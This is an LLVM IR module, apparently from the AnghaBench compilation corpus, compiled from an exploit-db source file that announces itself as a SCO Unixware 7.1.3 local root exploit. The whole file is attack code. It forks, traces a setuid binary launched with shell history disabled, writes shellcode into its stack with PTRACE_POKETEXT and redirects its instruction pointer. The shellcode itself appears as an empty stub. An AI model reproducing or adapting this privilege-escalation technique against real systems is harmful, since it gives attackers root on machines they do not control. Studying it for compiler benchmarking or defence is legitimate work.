; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_1534.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_1534.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.user_regs_struct = type { i64, i32 }

@.str = private unnamed_addr constant [19 x i8] c"HISTFILE=/dev/null\00", align 1
@__const.main.env = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i32 0, i32 0), i8* null], align 16
@.str.1 = private unnamed_addr constant [41 x i8] c"[ SCO Unixware 7.1.3 local root exploit\0A\00", align 1
@.str.2 = private unnamed_addr constant [19 x i8] c"[ Usage: [binary]\0A\00", align 1
@.str.3 = private unnamed_addr constant [59 x i8] c"[ e.g -rwsr-sr-x root root /linux/opt/kde2/bin/kcheckpass\0A\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"fork\00", align 1
@PTRACE_TRACEME = common dso_local global i32 0, align 4
@PTRACE_GETREGS = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@PTRACE_POKETEXT = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [14 x i8] c"[ Using 0x%x\0A\00", align 1
@PTRACE_SETREGS = common dso_local global i32 0, align 4
@PTRACE_DETACH = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.user_regs_struct, align 8
  %10 = alloca [2 x i8*], align 16
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  %12 = bitcast [2 x i8*]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 bitcast ([2 x i8*]* @__const.main.env to i8*), i64 16, i1 false)
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 2
  br i1 %15, label %16, label %20

16:                                               ; preds = %2
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.3, i64 0, i64 0))
  %19 = call i32 @exit(i32 0) #4
  unreachable

20:                                               ; preds = %2
  %21 = call i32 (...) @fork()
  store i32 %21, i32* %11, align 4
  switch i32 %21, label %36 [
    i32 -1, label %22
    i32 0, label %24
  ]

22:                                               ; preds = %20
  %23 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  br label %78

24:                                               ; preds = %20
  %25 = load i32, i32* @PTRACE_TRACEME, align 4
  %26 = call i32 (i32, i32, i32, ...) @ptrace(i32 %25, i32 0, i32 0, i32 0)
  %27 = call i32 (...) @getpid()
  store i32 %27, i32* %11, align 4
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %35 = call i32 @execle(i8* %30, i8* %33, i32* null, i8** %34)
  br label %78

36:                                               ; preds = %20
  %37 = load i32, i32* %11, align 4
  %38 = call i32 @waitpid(i32 %37, i32* null, i32 0)
  %39 = load i32, i32* @PTRACE_GETREGS, align 4
  %40 = load i32, i32* %11, align 4
  %41 = call i32 (i32, i32, i32, ...) @ptrace(i32 %39, i32 %40, i32 0, %struct.user_regs_struct* %9)
  %42 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %9, i32 0, i32 1
  %43 = load i32, i32* %42, align 8
  %44 = sub nsw i32 %43, 512
  store i32 %44, i32* %7, align 4
  store i32 %44, i32* %6, align 4
  br label %45

45:                                               ; preds = %50, %36
  %46 = load i32, i32* %8, align 4
  %47 = load i32, i32* @shellcode, align 4
  %48 = call i32 @strlen(i32 %47)
  %49 = icmp slt i32 %46, %48
  br i1 %49, label %50, label %65

50:                                               ; preds = %45
  %51 = load i32, i32* @PTRACE_POKETEXT, align 4
  %52 = load i32, i32* %11, align 4
  %53 = load i32, i32* %6, align 4
  %54 = load i32, i32* @shellcode, align 4
  %55 = load i32, i32* %8, align 4
  %56 = add nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = inttoptr i64 %57 to i32*
  %59 = load i32, i32* %58, align 4
  %60 = call i32 (i32, i32, i32, ...) @ptrace(i32 %51, i32 %52, i32 %53, i32 %59)
  %61 = load i32, i32* %8, align 4
  %62 = add nsw i32 %61, 4
  store i32 %62, i32* %8, align 4
  %63 = load i32, i32* %6, align 4
  %64 = add nsw i32 %63, 4
  store i32 %64, i32* %6, align 4
  br label %45

65:                                               ; preds = %45
  %66 = load i32, i32* %7, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %9, i32 0, i32 0
  store i64 %67, i64* %68, align 8
  %69 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %9, i32 0, i32 0
  %70 = load i64, i64* %69, align 8
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0), i64 %70)
  %72 = load i32, i32* @PTRACE_SETREGS, align 4
  %73 = load i32, i32* %11, align 4
  %74 = call i32 (i32, i32, i32, ...) @ptrace(i32 %72, i32 %73, i32 0, %struct.user_regs_struct* %9)
  %75 = load i32, i32* @PTRACE_DETACH, align 4
  %76 = load i32, i32* %11, align 4
  %77 = call i32 (i32, i32, i32, ...) @ptrace(i32 %75, i32 %76, i32 0, i8* null)
  br label %78

78:                                               ; preds = %65, %24, %22
  %79 = call i32 @usleep(i32 1)
  %80 = call i32 @wait(i32 0)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @fork(...) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @ptrace(i32, i32, i32, ...) #2

declare dso_local i32 @getpid(...) #2

declare dso_local i32 @execle(i8*, i8*, i32*, i8**) #2

declare dso_local i32 @waitpid(i32, i32*, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @wait(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
